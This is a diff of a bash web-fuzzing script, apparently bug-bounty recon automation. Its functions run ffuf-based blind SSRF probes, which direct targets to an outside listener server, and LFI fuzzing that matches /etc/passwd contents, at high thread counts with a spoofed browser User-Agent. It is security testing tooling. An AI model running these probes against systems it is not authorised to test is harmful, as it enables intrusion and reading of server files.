@@ -421,10 +421,6 @@ custompathlist(){
   fi
 
   if [[ -n "$fuzz" ]]; then
-    chown $HOMEUSER: $queryList
-    chown $HOMEUSER: $customSsrfLfiQueryList
-    chown $HOMEUSER: $customSqliQueryList
-
     echo "Prepare custom customSsrfLfiQueryList"
     # https://github.com/tomnomnom/gf/issues/55
     # sudo -u $HOMEUSER helpers/gf-filter.sh ssrf $queryList $customSsrfLfiQueryList &
@@ -432,17 +428,21 @@ custompathlist(){
     pid_01=$!
     echo
     echo "Prepare custom customSqliQueryList"
-    grep -oaiE "(([[:alnum:][:punct:]]+)+)?(php|aspx?)\?[[:alnum:]]+=([[:alnum:][:punct:]]+)?" $queryList > $customSqliQueryList || true &
+    grep -oaiE "(([[:alnum:][:punct:]]+)+)?(php3?)\?[[:alnum:]]+=([[:alnum:][:punct:]]+)?" $queryList > $customSqliQueryList || true &
     pid_02=$!
 
+    echo "wait $pid_01 $pid_02" 
     wait $pid_01 $pid_02
 
     sort -u $customSsrfLfiQueryList -o $customSsrfLfiQueryList
     sort -u $customSqliQueryList -o $customSqliQueryList
 
-    < $customSsrfLfiQueryList unfurl format '%p%?%q' > $TARGETDIR/ssrf-lfi-path-list.txt
+    < $customSsrfLfiQueryList unfurl format '%p%?%q' | sed "/^\/\;/d;/^\/\:/d;/^\/\'/d;/^\/\,/d;/^\/\./d" | qsreplace -a > $TARGETDIR/ssrf-lfi-path-list.txt
     sort -u $TARGETDIR/ssrf-lfi-path-list.txt -o $TARGETDIR/ssrf-lfi-path-list.txt
 
+    chown $HOMEUSER: $queryList
+    chown $HOMEUSER: $customSsrfLfiQueryList
+    chown $HOMEUSER: $customSqliQueryList
     echo "Custom queryList done."
   fi
 }
@@ -459,11 +459,11 @@ ssrftest(){
     echo
     # https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/burp-parameter-names.txt
     echo "[SSRF-2] Blind probe..."
-    xargs -n1 -I {} ffuf -r -c -t 550 -u HOST/\?{}=https://${LISTENSERVER}/DOMAIN/{} \
+    xargs -n1 -I {} ffuf -r -t 550 -u HOST/\?{}=https://${LISTENSERVER}/DOMAIN/{} \
                          -w $TARGETDIR/3-all-subdomain-live-scheme.txt:HOST \
                          -w $TARGETDIR/3-all-subdomain-live-socket.txt:DOMAIN \
                          -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 11_2_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.192 Safari/537.36" \
-                         -mode pitchfork < $PARAMSLIST
+                         -mode pitchfork < $PARAMSLIST > /dev/null
     echo "[SSRF-2] Blind probe done."
     echo
     if [ -s "$TARGETDIR/ssrf-lfi-path-list.txt" ]; then
@@ -499,7 +499,7 @@ ssrftest(){
       echo "HOSTCOUNT=$HOSTCOUNT \t ENDPOINTCOUNT=$ENDPOINTCOUNT"
       echo $(($HOSTCOUNT*$ENDPOINTCOUNT))
 
-          ffuf -r -c -t 550 -u HOSTPATH \
+          ffuf -t 550 -u HOSTPATH \
               -w $TARGETDIR/3-all-subdomain-live-scheme.txt:HOST \
               -w $TARGETDIR/ssrf-list.txt:PATH > /dev/null
       echo "[SSRF-5] done."
@@ -517,12 +517,25 @@ lfitest(){
         while read hostline; do
             echo "${hostline}${lfiline}" >> $TARGETDIR/lfi-list.txt
         done < $TARGETDIR/3-all-subdomain-live-scheme.txt
-    done < $TARGETDIR/ssrf-lfi-path-list.txt
+    done < $customSsrfLfiQueryList
 
     echo
     echo "[LFI] ffuf with all live servers with lfi-path-list using wordlist/LFI-payload.txt..."
-        ffuf -r -c -t 550 -u HOSTPATH \
-             -w $TARGETDIR/lfi-list.txt:HOST \
+      # simple math to watch progress
+      HOSTCOUNT=$(< $customSsrfLfiQueryList wc -l)
+      ENDPOINTCOUNT=$(< $LFIPAYLOAD wc -l)
+      echo "HOSTCOUNT=$HOSTCOUNT \t ENDPOINTCOUNT=$ENDPOINTCOUNT"
+      echo $(($HOSTCOUNT*$ENDPOINTCOUNT))
+    # 1 rabbit hole:
+        # ffuf -timeout 7 -t 550 -u HOSTPATH \
+        #      -w $TARGETDIR/lfi-list.txt:HOST \
+        #      -w $LFIPAYLOAD:PATH \
+        #      -mr "root:[x*]:0:0:" \
+        #      -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 11_2_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.192 Safari/537.36" \
+        #      -o $TARGETDIR/ffuf/lfi-matched-url.txt > /dev/null
+    # 2 real life:
+        ffuf -timeout 7 -t 550 -u HOSTPATH \
+             -w $customSsrfLfiQueryList:HOST \
              -w $LFIPAYLOAD:PATH \
              -mr "root:[x*]:0:0:" \
              -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 11_2_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.192 Safari/537.36" \
